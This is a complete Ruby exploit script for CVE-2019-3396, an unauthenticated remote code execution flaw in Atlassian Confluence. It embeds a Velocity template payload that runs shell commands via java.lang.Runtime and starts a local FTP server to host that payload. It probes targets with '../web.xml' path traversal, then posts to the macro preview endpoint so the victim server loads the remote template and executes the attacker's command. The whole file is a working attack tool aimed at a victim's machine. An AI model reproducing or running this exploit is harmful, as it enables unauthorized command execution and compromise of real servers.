#!/usr/bin/ruby


require 'net/http'
require 'net/https'
require 'uri'
require 'json'
require 'optparse'

begin
    require 'nokogiri'
    require 'ftpd'
    require 'colorize'
rescue LoadError
    puts "Please install required libraries via this command -> 'bundle install'" 
    exit(1)
end


PAYLOAD = %q{#set ($exp="test")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
}

TemplateData = {
    contentId: "1", macro: { name: "widget",
        params: { url: "https://www.youtube.com/watch?v=TzS5wEoHMgM", width: "1000", height: "1000" } ,
        body: ""
    }
}

class Driver
    def initialize(path)
        @path = path
    end

    def authenticate(user, password)
        return true
    end

    def file_system(user)
        return Ftpd::DiskFileSystem.new(@path)
    end
end

def create_payload_file(path)
    puts "#{'[*]'.blue} Create Payload File"
    payload_file = File.new(File.join(path,"payload.vm"),'w+')
    payload_file.write(PAYLOAD)
    payload_file.close()
end

def init_ftp_server(port)
    
    default_path = Dir.getwd()
    create_payload_file(default_path)
    driver = Driver.new(default_path)
    server = Ftpd::FtpServer.new(driver)
    server.interface = "0.0.0.0"
    server.port = port.to_i if port
    server.session_timeout = 180
    server.start()
    sleep(0.5)
    puts "#{'[*]'.blue} Ftp Server listening on port #{server.bound_port}"

    return server
    
end

def banner()
    puts "\n\t#{'exploit'.red}\t  ->\t#{'CVE-2019-3396'.blue}\n\t#{'Author'.red}\t  ->\t#{'Abdallah Mohamed Elsharif'.blue}"
    puts "\tGreetz to Ghost5egy and Hamza Abdulrahman and Omar and Alaa".green
    puts "\n\tUsage: \n\t\truby #{__FILE__.split('/')[-1]} [options] Or --help\n\n"
end

def register_options()
    args = Hash.new()
    option = OptionParser.new() do |opt|
        opt.on('-t','--target=TAERGET HOST','Enter your target host Ex(https://localhost:8090)') { |target|
            args[:target] = target
        }
        opt.on('-s','--scan','Just Scan Your Target') { |scan| 
            args[:scan] = scan
        }
        opt.on('-c','--command=Command','Enter your command to execute it on the victim\'s machine') { |cmd|
            args[:cmd] = cmd
        }
        opt.on('--ftp-serv=Host','Enter your host to host the exploit payload on') { |ftpserv|
            args[:ftpserv] = ftpserv
        }
        opt.on('--ftp-port=Port','Server Port') { |ftport|
            args[:ftport] = ftport
        }
    end.parse!

    return args
end

def make_headers(uri)
    return {
        'User-Agent'   => 'Mozilla/5.0 (Windows NT 10.0; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Referer'      => "#{uri.to_s}/pages/resumedraft.action?draftId=1&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        'Content-Type' => 'application/json; charset=utf-8'
    }
end

def sendMaliciousRequest(target_url,data = {})
    uri = URI.parse(target_url)
    headers = make_headers(uri)
    http = Net::HTTP.new(uri.host,uri.port)
    
    if uri.scheme == 'https' then
        http.use_ssl = true
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    uri = URI.join(uri.to_s,uri.path,"rest/tinymce/1/macro/preview")
    req = Net::HTTP::Post.new(uri.path,headers)
    req.body = TemplateData.merge(data).to_json()
    http.read_timeout = 120
    res = http.request(req)

    return res
end

def vulnerable?(target_url)
    fileName = '../web.xml'
    TemplateData[:macro][:params][:_template] = fileName
    res = sendMaliciousRequest(target_url, TemplateData)

    if (res.code == "200" && res.body.match("</web-app>")) then
        puts "#{'[+]'.green} Your Target is vulnerable to Unauthenticated Confluence Rce"
        return true 
    else
        puts "#{'[-]'.red} Your Target is not vulnerable"
        return false
    end
end

def exploit(target_url,ftp_payload_file,cmd)
    TemplateData[:macro][:params][:_template] = ftp_payload_file 
    TemplateData[:macro][:params][:command] = cmd 
    res = sendMaliciousRequest(target_url,TemplateData)
    
    if res.code == "200" && res.body.match("wiki-content") then
        puts "#{'[+]'.green} Exploit Succssful"
        parser = Nokogiri::HTML(res.body)
        parser.xpath('//body//div//div//div[@class="wiki-content"]').each do |result|
            puts "\nResult:"
            if result.first_element_child.nil? then
                puts "\t#{result.text.strip()}\n\n"
                
            else
                puts "\tCan't Get Output of this command\n\n"
            end

        end

    else
        puts "#{'[-]'.red} Exploit Failed"
    end
end

def main()
    banner()
    options   = register_options()
    target    = options[:target]
    scan      = options[:scan] 
    command   = options[:cmd]
    ftpserv   = options[:ftpserv]
    port      = options[:ftport]
    
    if target then
        if scan then vulnerable?(target); return end
        unless ftpserv then puts "#{'[*]'.blue} Set Your Host for run ftp server"; return end

        server = init_ftp_server(port)
        ftp_payload_file = "ftp://#{ftpserv}:#{server.bound_port}/payload.vm"

        if command then
            exploit(target,ftp_payload_file,command) if vulnerable?(target)

        else 
            puts "#{'[*]'.blue} Please Use command for launch attack"
        end

        server.stop()
        puts "#{'[*]'.blue} Ftp Server Closed"
        File.delete(File.join(Dir.getwd,"payload.vm"))
    end
end


main()
